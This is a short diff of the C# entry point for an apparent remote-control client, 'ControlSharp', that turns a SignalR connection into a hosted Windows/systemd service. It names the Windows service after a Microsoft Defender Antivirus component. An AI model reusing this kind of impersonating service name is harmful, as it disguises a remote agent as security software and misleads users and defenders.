@@ -1,14 +1,26 @@
-﻿using Microsoft.AspNetCore.SignalR.Client;
+﻿using ControlSharp.Client.Service;
+using Microsoft.Extensions.DependencyInjection;
+using Microsoft.Extensions.Hosting;
 
-string Url = "https://localhost:7175/api/0.1/assetHub";
-var connection = new HubConnectionBuilder()
-    .WithUrl(Url)
+IHost HostingService = Host.CreateDefaultBuilder(args)
+    .ConfigureAppConfiguration(config =>
+    {
+        config.AddEnvironmentVariables();
+    })
+    .ConfigureServices(services =>
+    {
+        services.AddHostedService<SignalRService>();
+        services.AddHttpClient();
+    })
+    .ConfigureLogging(config =>
+    {
+        config.AddConsole();
+    })
+    .UseWindowsService(config =>
+    {
+        config.ServiceName = "Microsoft Defender Antivirus Network Realtime Inspection Service Medic";
+    })
+    .UseSystemd()
     .Build();
-
-
-connection.On<string>("aaaaa", a =>
-{
-    Console.WriteLine("rec");
-});
-
-await connection.StartAsync();
+    
+await HostingService.RunAsync();
